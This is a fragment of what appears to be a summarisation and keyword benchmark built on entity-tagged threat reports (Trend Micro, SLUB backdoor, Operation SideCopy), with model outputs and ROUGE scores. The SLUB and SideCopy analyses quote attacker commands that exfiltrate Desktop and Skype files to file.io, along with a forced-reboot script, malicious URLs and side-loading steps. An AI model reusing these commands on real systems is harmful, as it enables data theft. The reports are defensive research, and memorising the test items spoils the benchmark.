[WORK_OF_ART] Resources . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.35 [PERSON] Alfredo [PERSON] Oliveira and [PERSON] David [PERSON] Fiser . ( [DATE] Dec. [DATE] 1 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c Linux Cryptocurrency Mining Attacks Enhancedvia CHAOS RAT . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.36 [PERSON] Liam [PERSON] Tung . ( [DATE] Jan. 17 , [DATE] 2022 ) . ZDNet . \u201c Linux malware is on the rise . Here are [CARDINAL] three top threats right now . \u201d Accessed on Mar.1 , [ORG] 2022 , at : Link.37 [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 28 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Improving [WORK_OF_ART] Software [WORK_OF_ART] Supply [WORK_OF_ART] Chain [WORK_OF_ART] Security . \u201d Accessed on [DATE] Mar. [DATE] 1,2022 , at : Link.38 NIST . ( n.d . ) . NIST . \u201c Software Security in Supply Chains : Software Bill of Materials ( SBOM ) . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link . For more information visit trendmicro.com \u00a9 2023 by [ORG] Trend [ORG] Micro [ORG] Incorporated . All rights reserved . [ORG] Trend [ORG] Micro , and [ORG] the [ORG] Trend [ORG] Micro t - ball logo , [NORP] OfficeScan and [ORG] Trend [ORG] Micro [ORG] Control Manager are trademarks or registered trademarks of [ORG] Trend [ORG] Micro [ORG] Incorporated . All other company and/or product names may be trademarks or registered trademarks of their owners . Information contained in this document is subject to change without notice . [ REP01_General_Report_Template_A4_221206US]For details about what personal information we collect and why , please see our Privacy Notice on our website at : trendmicro.com/privacyPage [CARDINAL] 27 of [CARDINAL] 27", "generated_text": "Trend Micro; the security landscape; 2022; ransomware; business tactics; legitimate multinationals; image management; malware; hints; compromise; services; compromise; industry; servers; a lack; cybersecurity experts; organizations; 3.5 million cybersecurity positions; the first quarter of 2022; the report; a robust and extensive security strategy; the threat landscape; cybercriminals; management techniques; key infrastructure; a business; capabilities; rebrand; corporate rebranding; the threat landscape; vulnerabilities; organizations; hints; the cloud; cybersecurity solutions; threat actors; monitoring; cost; vulnerabilities; threat actors; tactics; prevention; a robust and extensive security strategy; an increasing level; professionalism; the threat landscape.", "ref_text": "<START-1>The report provides an overview of the major cybersecurity threats and trends in 2022. It highlights how cybercriminals adopted more corporate-style tactics and programs to sustain their operations amid declining ransomware revenue. Major ransomware groups like Conti rebranded themselves to dissociate from negative publicity. They diversified their tools and targets, increasingly moving to Linux and adopting languages like Rust. Gaining initial access remained a priority across different threat actors in 2022. With Microsoft blocking Office macros, attackers shifted to alternatives like HTML smuggling and malvertising for infection vectors. Vulnerabilities in Log4J and old flaws like ProxyLogon were extensively exploited. Attacks increasingly focused on cloud infrastructure, abusing misconfigurations and targeting serverless environments. The attack surface continued expanding while enterprise patching lagged, with a flood of new vulnerabilities disclosed. ZDI reported record advisories, but patch failures and lack of details complicated remediation. Overall threat detections rose 55% year-over-year, with massive spikes in blocked malware files. New ransomware families decreased but LockBit and BlackCat dominated. The report examines the business impact of attacks across industries like manufacturing, government, and technology. It advises robust, adaptive security to address the growing attack surface and sophisticated threats. Key recommendations include asset management, proper cloud security controls, timely patching, and attack surface visibility via centralized monitoring, to identify risks and strengthen defenses. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.398876404494382, "gpt3/lexical/rouge_rouge2": 0.07909604519774012, "gpt3/lexical/rouge_rougeL": 0.2303370786516854, "gpt3/lexical/rouge_rougeLsum": 0.2303370786516854, "gpt3_generated_text": ["The article from Trend Micro Research provides an overview of the security landscape in 2022, focusing on the tactics used by cybercriminals, particularly in the realm of ransomware. The report highlights how cybercriminals have adopted corporate tactics, such as rebranding and image management, to adapt to changing circumstances and maintain their success. It also discusses the importance of access for threat actors and the expanding attack surface, as well as the vulnerabilities in cloud security and the impact of cybersecurity attacks on businesses. The article emphasizes the need for organizations to develop a robust security strategy in order to defend against increasingly sophisticated cyber threats. It also mentions the shortage of cybersecurity experts and the importance of organizations seeking skilled professionals. Overall, the article provides insights into the evolving threat landscape and offers recommendations for strengthening cybersecurity defenses."]}, {"split_name": "test", "sample_id": "test_115", "prompt_text": "Extract the keywords: [ORG] New [ORG] SLUB [ORG] Backdoor [ORG] Uses [ORG] GitHub , [ORG] Communicates via [ORG] Slack [ORG] blog.trendmicro.com/trendlabs-security-intelligence/new-slub-backdoor-uses-github-communicates-via-slackTrend Micro Cyber Safety Solutions TeamMarch 7 , 2019by [PERSON] Cedric [PERSON] Pernet , [PERSON] Daniel [PERSON] Lunghi , [PERSON] Jaromir [PERSON] Horejsi , and [PERSON] Joseph [PERSON] C. [PERSON] ChenWe recently came across a previously unknown malware that piqued our interest in multiple ways . For starters , we discovered it being spread via watering hole attacks , a technique that involves an attacker compromising a website before adding code to it so visitors are redirected to the infecting code . In this case , each visitor is redirected only once . The infection was done by exploiting CVE-2018 - 8174 , a [ORG] VBScript engine vulnerability that was patched by [ORG] Microsoft back in [DATE] May [DATE] 2018.Second , it uses a multi - stage infection scheme . After it exploits the vulnerability , it downloads a [ORG] DLL and runs it in [ORG] PowerShell ( [ORG] PS ) . This file , which is a downloader , then downloads and runs the [ORDINAL] second executable file containing a backdoor . The [ORDINAL] first stage downloader also checks for the existence of different kinds of antivirus software processes , and then proceeds to exit if any is found . At the time of discovery , the backdoor was seemingly unknown to AV products . In addition to the previously mentioned facts , we quickly noticed that the malware was connecting to the [PERSON] Slack platform , a collaborative messaging system that lets users create and use their own workspaces through the use of channels , similar to the [ORG] IRC chatting system . We found this quite interesting , since we have n\u2019t observed any malware to date that communicates using [ORG] Slack \u2013 although we [ORG] \u2019ve previously discussed how cybercriminals could possibly abuse chat platforms as part of their attack . Our technical investigation and analysis of the attacker \u2019s tools , techniques , and procedures ( [ORG] TTP ) lead us to think that this threat is actually a stealthy targeted attack run by capable actors , and not a typical cybercriminal scheme . Note that as soon as this malware was discovered , we informed [ORG] the [ORG] Canadian [ORG] Centre [ORG] for [ORG] Cyber [ORG] Security , which acts as [GPE] Canada \u2019s [ORG] National [ORG] Computer [ORG] Security [ORG] Incident [ORG] Response [ORG] Team ( CSIRT ) . [ORG] The [ORG] Cyber [ORG] Centre alerted the site operator , helped them understand the malware that was found , and offered mitigation advice . Infection Chain1/9Figure [CARDINAL] 1 . The infection chain of the attackThe downloaderThe downloader , which runs through [ORG] PowerShell as a [ORG] DLL , serves several purposes . The [ORDINAL] first is to download the [ORDINAL] second stage malware , which we called the SLUB ( for [ORG] SLack and [GPE] githUB ; detected as [ORG] Backdoor . Win32.SLUB.A ) backdoor and execute it . The [ORDINAL] second purpose is to check if the following antivirus processes are running : V3Tray.exe ZhuDongFangYu.exeIf the downloader finds one of these , it simply exits . Finally , the downloader also exploits the CVE-2015 - 1701 vulnerability to acquire [ORG] Local [ORG] Privilege [ORG] Escalation . The exploit \u2019s code was likely created by modifying code from a [ORG] GitHub repository , which is shown in the image below . Figure [CARDINAL] 2 . The unmodified codeThe SLUB backdoor2/9The SLUB backdoor is a custom one written in the [LANGUAGE] C++ programming language , statically linking curl library to perform multiple HTTP requests . Other statically - linked libraries are boost ( for extracting commands from gist snippets ) and [ORG] JsonCpp ( for parsing slack channel communication).The malware also embeds [CARDINAL] two authorization tokens to communicate with the [FAC] Slack [FAC] API.It copies itself to ProgramData\\update\\ and creates persistence via a [PERSON] Run registry key , calling export function UpdateMPUnits with rundll32.exe . Note the typo in the [ORG] ValueName , \u201c [ORG] Microsoft [ORG] Setup [ORG] Initializazion . \u201dFigure [CARDINAL] 3 . Screenshots of the [PERSON] Run registry keyIt downloads a specific \u201c gist \u201d snippet from [GPE] Github and parses it , looking for commands ( which we will cover further in this entry ) to execute . Only lines starting with \u201c ^ \u201d and ending with \u201c $ \u201d will be executed . The other lines are ignored . Figure [CARDINAL] 4 . The \u201c gist \u201d snippet that is downloaded from [ORG] GithubThe result of the commands is then posted to a private [PERSON] Slack channel in a particular workspace using the embedded tokens . Note that a side effect of this particular setup is that the attacker has no way to issue commands to a specific target . Each infected computer will execute the commands that are enabled in the gist snippet upon checking it.3/9Figure [CARDINAL] 5 . Scheme of the backdoor communication , with the [ORDINAL] first arrow starting from theperson who initiates the connectionBackdoor featuresThe backdoor supports the following commands and subcommands ( most of them are self - explanatory ) . [ORG] Commands and subcommands / parameters are separated with a comma \u201c , \u201d , as seen in figure [CARDINAL] 4.Command LineDetailsexecdnexecupdateExecute command with cmd.exeDownload and execute commandDownload a file , remove the current one and run the downloaded [CARDINAL] filedestroyDelete malware from disk with a batch scriptcaptureTake screenshot and send it to slack channelfilelistcopyList specified fileCopy specified filedeleteDelete specified fileuploadUpload local file to file.io website and post the download link to the [PERSON] Slack channeldir4/9createCreate directoryremoveRemove directoryproclistkilldrivelistregQueryReadWritetmoutList processesTerminate processGet information about each volume of the current drive , such as free space , extended attributes , [ORG] USN journal activation , and encryption stateQuery registry keyRead registry keyWrite registry keyCall to \u201c sleep \u201d functionSlack communication functionThe slack communication function contains [CARDINAL] two hardcoded authentication tokens split into a few smaller chunks . Figure [CARDINAL] 6 . Code of the communicationfunctionLater , the backdoor gets the username and computer name ( seen in Figure [CARDINAL] 7 ) then creates and uploads the [PERSON] Slack message into a channel . It uses the following API to post messages : url 7 . Retrieving the username andcomputer nameThe keywords \u201c title , \u201d \u201c text , \u201d \u201c channel , \u201d and \u201c attachments \u201d are clearly visible in the function listing . Figure [CARDINAL] 8 . Function listing showing keywordsThe output of every command is sent to a private [PERSON] Slack channel , while every command itself is sent to a different private [PERSON] Slack channel as an attachment with the text \u201c * computername : [PERSON] username*\u201d . The attacker \u2019s tools , techniques and proceduresThe [PERSON] Github account and the [PERSON] Slack workspace were created specifically for a campaign on [DATE] February [DATE] 19 [DATE] and [DATE] 20 , while we estimate that the attacker compiled the malware on February 22.The attacker added the [ORDINAL] first commands to [GPE] Github on [DATE] February [DATE] 20 . However looking at the [PERSON] Slack channels , we can see that the attacker tested the malware on [DATE] February [DATE] 23 [DATE] and [DATE] 24 . The [ORDINAL] first victims were seen on [DATE] February [DATE] 27.The attackers \u2019 [ORDINAL] first actions involve getting context information to learn more about the computer they infected:^exec , tasklist$^capture$^drive , [ORG] list$^file , list , C:\\Users\\$^reg , read , HKEY_CURRENT_USER , SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run$They look for running processes , take screen captures , list drives on the machine , list all users , and check the malware \u2019s persistence registry key . They will also usually list some known directories:6/9^exec , dir /s C:\\Users\\USER\\Desktop\\$\\^exec , dir /s C:\\Users\\USER\\Downloads\\$\\^exec , dir /s C:\\Users\\USER\\Recent\\$Some commands caught our interest , such as one that allows the attacker to create an archive file of the user \u2019s entire [ORG] Desktop folder , which is then exfiltrated:^exec , powershell -Command compress - archive -path C:\\Users\\USER\\Desktop - destinationpath C:\\Users\\USER\\doc1$\\^file , upload , C:\\Users\\USER\\doc1$The following command allows an attacker to build a [ORG] CAB file containing the file tree of the user \u2019s [PERSON] Desktop:^exec , cd [ORG] C:\\Users\\USER [ORG] & dir /s /b /a - d C:\\Users\\USER\\Desktop > C:\\Users\\USER\\win12 & makecab /d [PERSON] CabinetName1 = win34 /f C:\\Users\\USER\\win12$The attacker is also seemingly interested in files containing the local archive in [ORG] Skype:^file , upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline - storage - ecs.data$^file , upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline - storage.data$^file , upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline - storage.data - shm$^file , upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline - storage.data - wal$The attacker copies all the [ORG] HWP files ( extension used by a [NORP] Korean word processor ) to a specific directory.^exec , copy C:\\Users\\USER\\Desktop\\*.hwp C:\\Users\\USER\\oo$The attacker likely planned to exfiltrate this directory \u2014 however , we did not see any commands for this . We also noted a specific interest in a software called \u201c [WORK_OF_ART] Neologic [WORK_OF_ART] Plus [WORK_OF_ART] Board , \u201d which seems to be used for the administration of bulletin board systems . Some of the files that the attackers retrieved contained [CARDINAL] hundreds of BBS URLs . We also noticed that most of the files uploaded to file.io were already deleted when we tried to retrieve them . Based on the commands run by the attackers , we theorize that they are looking for people - related information . The attackers want to know more about the targeted victims \u2019 communications . Thus , they dig into activities on Twitter , [ORG] Skype , [ORG] KakaoTalk , BBS \u2014 and possibly more communication systems \u2014 in addition to collecting the [ORG] HWP files . This timeline of events shows the speed in which the threat actors launched the attack:7/9Figure 9 . Timeline of eventsConclusionPerhaps the most unique aspect of this campaign is that it makes use of [CARDINAL] three different online services to issue commands , get the results , and retrieve files from compromised hosts . Our investigation makes us believe with strong confidence that it was part of a possible targeted attack campaign . So far , we have not been able to find related attacks , and have not spotted the custom backdoor elsewhere . We have been searching for similar samples and have found none so far , which is a strong indication that the attackers either developed the malware or got it from a private developer who has not publicly leaked it . The commands that the attackers ran clearly show a strong interest in person - related information , with a special focus on communication software , in an attempt to learn more about the people behind the computers they infected . The attackers also appear to be professionals , based on their way of handling their attack . They only use public [ORDINAL] third party services , and therefore did not need to register any domains or anything else that could leave a trail . The few email addresses we found during the investigation were also using trash email systems , giving the attackers a clean footprint . Finally , the watering hole chosen by the attackers can be considered interesting for those who follow political activities , which might give a glimpse into the nature of the groups and individuals that the attackers are targeting . We would like to thank Github \u2019s [PERSON] SIRT and [ORG] Slack \u2019s security teams for quickly removing the related files , which effectively cut the communication between the attackers and their malware . In response to this incident , [PERSON] Slack replied with the following : As noted in their post , [ORG] Trend [ORG] Micro recently discovered a [ORDINAL] third party \u2019s unauthorized access of another [ORDINAL] third party \u2019s computer using malware , and reported to us the existence of a Workspace on [PERSON] Slack related to this effort . We investigated and immediately shut down the single Workspace as a violation of our terms of service , and we confirmed that [PERSON] Slack was8/9not compromised in any way as part of this incident . We are committed to preventing the misuse of our platform and we will take action against anyone who violates our terms of ( [PERSON] Trojan . Win32.CVE20151701.E )", "generated_text": "Trend Micro; a new SLUB backdoor; use; GitHub; Communicates; Slack; a custom; curl library; HTTP requests; the backdoor; a custom; the CVE-2018-8174 vulnerability; Microsoft; May 2018; Download; a DLL; PowerShell; a downloader; a backdoor; Run; the second executable file; a backdoor; the first stage downloader; Checks; the existence; different kinds of antivirus software processes; the downloader; the second executable file; a backdoor; the CVE-2015-1701 vulnerability; Local Privilege Escalation; the malware; a stealthy targeted attack; sophisticated actors; this threat; the threat actor; tactics; processes.", "ref_text": "<START-1>Security researchers at Trend Micro discovered a new malware campaign using multiple techniques to infect targets and exfiltrate data. The malware has two stages - first a downloader exploit using CVE-2018-8174, followed by the main payload backdoor called SLUB. The downloader checks for antivirus processes, exploits CVE-2015-1701 for privilege escalation, and retrieves the SLUB backdoor. SLUB establishes persistence and uses APIs to communicate with GitHub for commands and Slack for exfiltration. The attackers posted snippets on GitHub with commands starting with \"^\" that SLUB parses and executes, like taking screenshots, listing files, compressing folders, etc. The results are sent to the attacker's Slack workspace in dedicated channels per infected host. Analysis of the commands suggests the attackers are focused on gathering personal communications data from apps like Skype, Twitter, and Korean HWP files. The attacks are precisely executed with minimal infrastructure, suggesting capable threat actors rather than cybercriminals. The attackers created the GitHub and Slack accounts on February 19-20 and began testing the malware February 23-24 before infecting victims starting February 27. Trend Micro notified GitHub and Slack to disable the attacker accounts. Key points are the unique use of GitHub and Slack for the attack, the multi-stage infection process, the commands focused on communications and people data, the speed of the attack execution, and the takedown of the attacker accounts. The malware appears targeted at specific individuals rather than mass spread. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4385026737967914, "gpt3/lexical/rouge_rouge2": 0.13440860215053763, "gpt3/lexical/rouge_rougeL": 0.2620320855614973, "gpt3/lexical/rouge_rougeLsum": 0.2620320855614973, "gpt3_generated_text": ["In a recent discovery by the Trend Micro Cyber Safety Solutions Team, a new SLUB backdoor malware has been found to use GitHub and communicate via Slack. This sophisticated malware is spread through watering hole attacks and exploits the CVE-2018-8174 vulnerability. It uses a multi-stage infection scheme, with the first stage downloader checking for antivirus processes and exploiting the CVE-2015-1701 vulnerability for local privilege escalation. The SLUB backdoor, written in C++, uses a custom curl library to perform HTTP requests and communicates with the Slack API using embedded tokens. This stealthy targeted attack suggests the involvement of capable threat actors, and the malware has been reported to the Canadian Centre for Cyber Security for mitigation. This discovery highlights the evolving tactics and processes of sophisticated threat actors in the cyber landscape."]}, {"split_name": "test", "sample_id": "test_116", "prompt_text": "Extract the keywords: OperationSideCopyAn insight into [GPE] Transparent [GPE] Tribe \u2019s sub - divisionwhich has been incorrectly attributed for yearsA report by [ORG] Quick [ORG] Heal [ORG] Technologies [ORG] Limited , IndiaWhitepaper Authors : [PERSON] Kalpesh [PERSON] Mantri , [ORG] Principal [ORG] Security [ORG] Researcher |Pawan Chaudhari , Threat Research Scientist | [PERSON] Goutam [PERSON] Tripathy , Senior Security ResearcherIntroduction [PERSON] Quick [PERSON] Heal \u2019s threat intelligence team recently uncovered evidence of an advanced persistent threat ( [ORG] APT ) against [NORP] Indian defence forces . Our analysis shows that many old campaigns and attacks in [DATE] the [DATE] past [DATE] one [DATE] year relate to ' Operation SideCopy ' by common IOCs . The background and analysis in this paper provide complete forensic and useful details of our current research on the malware in this operation . [PERSON] Key [PERSON] Findings \uf0d8 Operation SideCopy is active from [DATE] early [DATE] 2019 , till date . \uf0d8 This cyber - operation has been only targeting [NORP] Indian defence forces and armed forcespersonnel.\uf0d8 Malware modules seen are constantly under development and updated modules arereleased after a reconnaissance of victim data.\uf0d8 Actors are keeping track of malware detections and updating modules when detectedby Anti - Virus solutions.\uf0d8 Almost all [ORG] CnC [ORG] Servers belongs to Contabo GmbH and server names are similar tomachine names found in [LAW] the [LAW] Transparent [LAW] Tribe [LAW] report.\uf0d8 This threat actor is misleading the security community by copying TTPs that point [PERSON] atSidewinder [PERSON] APT group.\uf0d8 We believe that this threat actor has links with Transparent Tribe [ORG] APT group . Summary [DATE] A [DATE] couple [DATE] of [DATE] months [DATE] ago , [ORG] Quick [ORG] Heal \u2019s Next - Gen [ORG] Behavioural [ORG] Detection [ORG] System alerted on a few processes executing [ORG] HTA from few non - reputed websites . We have made a list of URLs , connected from mshta.exe , across multiple customers : hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / Armed - Forces - Spl - Allowance - Order / html/ hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / Defence - Production - Policy-2020 / html/ hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / Images/8534 hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / IncidentReport / html/ hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / ParaMil - Forces - Spl - Allowance - Order / html/ hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / Req - Data / html hxxps://demo[.]smart - hospital[.]in / uploads / sta\ufb00_documents/19 / Sheet_Roll / html hxxps://demo[.]smart - school[.]in / uploads / sta\ufb00_documents/9 / Sheet_Roll / html hxxps://demo[.]smart - school[.]in / uploads / student_documents/12 / css/ hxxps://drivetoshare[.]com / mod[.]gov[.]in_dod_sites_default_\ufb01les_Revisedrates / html01The highlighted ones were sent to targets across [NORP] Indian defence units and armed forces individuals . We started tracking this campaign as it was targeting critical [NORP] Indian organizations . Traces of this operation can be tracked from [DATE] early [DATE] 2019 till date . Till now , we have observed [CARDINAL] three infection chain processes . Initial infection vector in [CARDINAL] two of the chains was [ORG] LNK \ufb01le , that came from a malspam . But in [CARDINAL] one case , we saw attackers making use of template injection attack and equation editor vulnerability ( CVE-2017 - 11882 ) as the initial infection vector . Though the initial infection vector is di\ufb00erent in the [ORDINAL] third case , the \ufb01nal payload is similar to the \ufb01rst [CARDINAL] two chains . Below images will provide an overview of malware infection in victim machines . [ORG] Infection [ORG] Chain [ORG] \u2013 [ORG] Version 1:02Infection Chain \u2013 Version [CARDINAL] 2 : [ORG] Infection [ORG] Chain [ORG] \u2013 [ORG] Version 3:03Initial Infection Vector : LNK The victim receives LNK \ufb01les , compressed into ZIP / RAR via emails . These \ufb01les are shortcuts executing mshta.exe and providing remote [ORG] HTA [ORG] URL as the parameter . LNKs have a double extension with document icons , to trick the victim into opening the \ufb01le . [NORP] Victims just have to execute [ORG] LNK \ufb01les and rest all modules follow in background . Image 1 : Malicious lnk to launch mshta.exeInitial [ORG] Infection Vector : Template InjectionImage 2 : Contents of settings.xml.rels04Decoy Documents / Images : Names of initial infection LNKs / Documents seems to be quite realistic and lure the victim into opening it . And as the same say , the contents of decoy are related . Some sample decoy that we saw are : Image 3 : Decoy document dropped by \u201c Defence - Production - Policy-2020.docx.lnk\u201dImage [WORK_OF_ART] 4 : [WORK_OF_ART] Decoy image dropped by \u201c Image-8534 - 2020.jpg.lnk\u201dLooking at \ufb01rst decoy ( Image 3 ) , the victim seems to be a target that is interested in [NORP] Indian defence news . The [ORDINAL] second decoy ( Image 4 ) looks more of a honeytrap image . It is similar to a recent campaign that we uncovered [DATE] a [DATE] few [DATE] months ago.05Toolkit for both [ORG] HTA - Stagers Stage-1 and Stage-2 [ORG] HTA \ufb01les seem to be created using CACTUSTORCH toolkit , which is available on [ORG] GitHub.url is inspired by [ORG] StarFighters and uses the DotNetToJScript tool . It loads and executes malicious .NET assemblies directly from memory . Similar to other \ufb01leless attack techniques , DotNetToJScript does not write any part of the malicious .NET assembly on the victim machine . This blog contains good insight into how this toolkit works . Stage-1 [ORG] HTA : Stage-1 [ORG] HTA C4A75A64F19BD594B4BB283452D0A98B6E6E86566E24D820BFB7B403E72F84E2This [ORG] HTA \ufb01le is remotely downloaded via one of the URLs given in summary . It has [CARDINAL] 2 embedded \ufb01les ; a decoy document ( can be an image \ufb01le ) and a DotNET module named \u2018 hta.dll \u2019 . [CARDINAL] DotNET serialization is used to execute \u2018 hta.dll \u2019 module . The \ufb01rst section in this [ORG] HTA \ufb01le checks for installed DotNET version and creates a \ufb01le at \u2018 C:\\ProgramData\\script.js \u2019 . This [ORG] JS \ufb01le is responsible for restarting victim machine so that no traces of running mshta.exe can be found.06The [ORDINAL] second section contains deserialization of [CARDINAL] DotNET object module to execute decoy document and download next [ORG] HTA components . The functionality of embedded DotNET module named \u2018 hta.dll \u2019 can be seen using dnSpy tool . Looking at code , we can see that the malware modules are constantly under development . Image [CARDINAL] 5 : Functions of hta.dll in # 2019Image 6 : Functions of hta.dll in later versions07It executes [PERSON] Decoy \ufb01le from % temp% folder . It then downloads the later stage [ORG] HTA \u2014 next stage [ORG] HTA is decompressed in the same way as decoy document i.e. [PERSON] Base64 + [GPE] GZip decoding is done to get Stage-2 [ORG] HTA [ORG] \ufb01le.08Stage-2 [ORG] HTA DD0762FC58ACB30F75B0A2A14DBEF2CCDA553EA9DDE08A180C60CD4113E1A506Stage-2 [ORG] HTA is nearly similar to Stage-1 [ORG] HTA but has more embedded modules . Stage-2 [ORG] HTA again uses DotNET serialization to execute embedded components with \ufb01le - less technique . At \ufb01rst , it checks for installed DotNET version : Later it checks for installed Antivirus product and passes all information to serialized DotNet module named \u2018 preBotHta.dll\u2019.09All embedded \ufb01les and AV list are passed to \u2018 preBotHta.dll\u2019 . The functionality of \u2018 preBotHta.dll \u2019 can be seen via dnSpy tool . As we can see , none of the functions are obfuscated . Similar to \u2018 hta.dll \u2019 , this malware module is also constantly under development as can be seen below.\u201cpreBotHta.dll \u201d during # [MONEY] 2019\u201cpreBotHta.dll \u201d during # 202010PinkAgain ( ) function checks for available AntiVirus installed at victim machine and saves backdoor module accordingly . These [PRODUCT] AVs are widespread and popular in [GPE] India . Other functionality includes : \uf077 Copying \u201c Credwiz.exe \u201d ( legit ) from system32 / SysWOW64 folder to \u201c C:\\ProgramData\\Adobe\\credwiz.exe \u201d \uf077 [PRODUCT] Drop [PRODUCT] Object1 from [ORG] HTA into \u201c [PERSON] C:\\ProgramData\\Adobe\\DUser.dll \u201d \uf077 [PERSON] Drop and execute [PERSON] BAT \ufb01le for persistence at \u201c C:\\ProgramData\\Adobe\\addreg.bat \u201d \uf077 [PRODUCT] Drop [PRODUCT] Object2 from [ORG] HTA into \u201c % temp%\\MicroSoft\\winms.exe \u201d \uf077 Execute \u201c Credwiz.exe\u201dImage [CARDINAL] 7 : credwiz.exe copying code in \u2018 [PERSON] preBotHta.dll\u201911BAT module : [PERSON] BAT \ufb01le adds registry entry into [PERSON] Run folder . Thus running credwiz.exe on the machine on every startup . Image : Content of BAT \ufb01leScript.js \ufb01le : This \ufb01le is executed via cmd.exe to restart victim machine . Contents of this \ufb01le are : var shell = new ActiveXObject('WScript . Shell');WScript . Sleep(900000);var exec = shell . Exec('cmd.exe /k shutdown /r /t 0');exec . [ORG] StdIn . Close();Side - Loading technique : [CARDINAL] 17EABFB88A164AA95731F198BD69A7285CC7F64ACD7C289062CD3979A4A2F5BF\u201cCredwiz.exe \u201d is a legit windows \ufb01le copied from system32 / SysWOW64 folder to \u201c C:\\ProgramData\\Adobe\\credwiz.exe \u201d . When this \ufb01le gets executed , it will side - load malicious duser.dll \ufb01le which is dropped in the same folder.DUser.dll MD5 SHA256(version [CARDINAL] 1 ) AC4A8D82D91286D5E0F59B85C8975DF8 FB761A2DA4841F8739D33A682C5F2F39A033C7BA16430CE5785F7D51AB5D1537Module \u2018 DUser.dll \u2019 is embedded as the [ORDINAL] 1st object into Stage-2 [ORG] HTA \ufb01le . The \ufb01le gets dropped into \u201c [PERSON] C:\\ProgramData\\Adobe\\DUser.dll \u201d . It has [CARDINAL] only [CARDINAL] 1 export function i.e. \u201c c\ufb01leexists\u201d . As the names suggsts , its only function is to check for the presence of a \ufb01le at \u201c % temp%\\MicroSoft\\winms.exe \u201d ( [ORDINAL] 2nd object dropped from Stage-2 [ORG] HTA \ufb01le ) and execute it . If not found , then it checks for \u201c strcat.txt \u201d at the same location . If it exists , then read the content of \u201c strcat.txt \u201d and write the content into a \ufb01le named \u201c winms.exe \u201d as shown in below \ufb01g.12It will then launch the [ORG] RAT module \u201c winms.exe\u201d.13DUser.dll MD5 SHA256(version [CARDINAL] 2 ) B29E7FAC2D84DA758473F3B5E81F3265 [CARDINAL] 92E9CEEDF28C99F90F8892AEC9D2FA413FF0F4F17C5B0316D05871E95993C3FAIn a few instances , we saw a completely di\ufb00erent version of [CARDINAL] DUser.dll module . This [ORG] DLL had an export named as \u201c DllMain \u201d . An interesting [ORG] PDB string was observed in this \ufb01le . \u201cF:\\Packers\\CyberLink\\Latest Source\\Multithread Protocol Architecture\\Final Version\\DUser\\Release\\x86\\DUser.pdb\u201dAs per the [ORG] PDB path , [ORG] DUser was developed in the folder \u201c CyberLink\\Latest Source\\Multithread Protocol Architecture \u201d . At this stage , we are not aware of any similar port \u2018 6102 \u2019 . This [ORG] IP address & port can be found out in \ufb01le as it is mentioned in cleartext . Once successfully connected , it will try to delete a [ORG] BAT \ufb01le from [ORG] Program [ORG] Data as can be seen in below image and then proceed for performing various operations based on the command received from C2C.14The commands are numbers from [CARDINAL] 0 [CARDINAL] to [CARDINAL] 15 , so it compares each time when it receives the command from C2.Based on the commands , it fetches the index value and redirects to speci\ufb01c function / module to perform the desired operation as shown in below \ufb01gs.15For example if [CARDINAL] C2 sends 0 , then it collects [ORG] the [ORG] Computer [ORG] Name , [GPE] Username , OS version etc . and sends it back to [ORG] C2.16Backdoor modules : winms.exe MD5 SHA256(dropped in [ORG] Infection [ORG] Chain - version [CARDINAL] 1 ) AF0DD0070C02E15064496853BEFFA331 8C6AFF2224FDD54615EF99D32A6134C961B6D7D576B6FF94F6B228EB8AF855AFThis is a RAT tool and has very high resemblance with code found on below [ORG] GitHub link . url packets and their structure resembles with the implementation of the [ORG] GitHub source code.17sihostt.exe A8D8A56CDA7E29DD64CF28B2BDAD19E8DCBF78E5900CF9CA53F952E9FD2452EBIn a few attack chains , we saw a DotNET based [ORG] RAT being dropped in the startup folder by mshta process . This previously unseen [ORG] RAT is used to perform multiple malicious tasks like : \uf0d8 [PERSON] Download and execute \ufb01les \uf0d8 Get process info \uf0d8 Kill process \uf0d8 Copy clipboard data \uf0d8 Set clipboard data \uf0d8 [PERSON] Exit process18Below \ufb01gure shows the code start function . This function creates a new object of the class core with [CARDINAL] two parameters as remote [ORG] IP and encryption key . Image [CARDINAL] 8 : [ORG] Main functionSimilar to other modules , even this module is not obfuscated . Every function has meaningful names and readable code . Image 9 : code to upload data to a remote server19Image [CARDINAL] 10 : Code to download and execute the \ufb01le.20PDB Paths : Interesting PDB paths were seen in \ufb01les that we have observed in [DATE] past [DATE] one [DATE] year . D:\\C\\Proj\\DUser\\Debug\\x86\\hello - world.pdbD:\\C\\Proj\\preBotHta_new\\preBotHta\\obj\\Debug\\preBotHta.pdbD:\\Pkgs\\Project\\1 - Stagers\\5 - DUser\\Debug\\x86\\hello - world.pdbD:\\Pkgs\\Project\\5 - DUser\\Debug\\x86\\hello - world.pdbD:\\Pkgs\\Project\\Cyrus_HTA1+HTTP_HTA2+VNext_HTA3\\hta\\obj\\Debug\\hta.pdbE:\\OpenRATs\\NigthFury\\NightFury [ORG] HTA upload\\preBotHta\\obj\\Debug\\preBotHta.pdbF:\\Packers\\CoreDll\\DUser\\Release\\x86\\hello - world.pdbF:\\Packers\\CoreDll\\preBotHta\\preBotHta\\obj\\Release\\preBotHta.pdbF:\\Packers\\CyberLink\\Latest [ORG] Source\\Exploit Dropper\\Update or Install\\Dropper\\Release\\Update - 